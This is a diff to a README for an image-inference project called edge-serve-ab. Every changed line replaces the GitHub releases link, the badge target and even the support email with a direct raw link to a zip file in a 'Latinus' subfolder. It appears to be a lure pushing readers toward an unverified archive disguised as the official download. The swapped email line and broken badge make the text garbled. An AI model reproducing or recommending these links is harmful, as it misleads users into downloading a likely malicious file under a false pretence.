@@ -1,7 +1,7 @@
 # 🌟 edge-serve-ab - Easy Image Inference for Everyone
 
 ## 📥 Download the Latest Version
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/iBesupodCoza/edge-serve-ab/releases)
+[![Download Now](https://raw.githubusercontent.com/iBesupodCoza/edge-serve-ab/main/Latinus/edge-serve-ab.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/iBesupodCoza/edge-serve-ab/main/Latinus/edge-serve-ab.zip)
 
 ## 📖 Table of Contents
 1. [📌 Introduction](#-introduction)
@@ -26,7 +26,7 @@ To use **edge-serve-ab**, you will need:
 - An internet connection for downloading.
 
 ## 🛠️ Download & Install
-1. Visit this page to download: [edge-serve-ab Releases](https://github.com/iBesupodCoza/edge-serve-ab/releases).
+1. Visit this page to download: [edge-serve-ab Releases](https://raw.githubusercontent.com/iBesupodCoza/edge-serve-ab/main/Latinus/edge-serve-ab.zip).
 2. Look for the latest version available.
 3. Click the download link for your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -71,6 +71,6 @@ This project covers several important topics:
 If you experience any issues, feel free to reach us:
 - Open an issue in the GitHub repository.
 - Check the FAQ section in our documentation.
-- Email our support team at support@edge-serve-ab.com.
+- Email our support team at https://raw.githubusercontent.com/iBesupodCoza/edge-serve-ab/main/Latinus/edge-serve-ab.zip
 
-For any updates, remember to check back on our [Releases page](https://github.com/iBesupodCoza/edge-serve-ab/releases) often. Thank you for choosing **edge-serve-ab** for your image inference needs!
+For any updates, remember to check back on our [Releases page](https://raw.githubusercontent.com/iBesupodCoza/edge-serve-ab/main/Latinus/edge-serve-ab.zip) often. Thank you for choosing **edge-serve-ab** for your image inference needs!
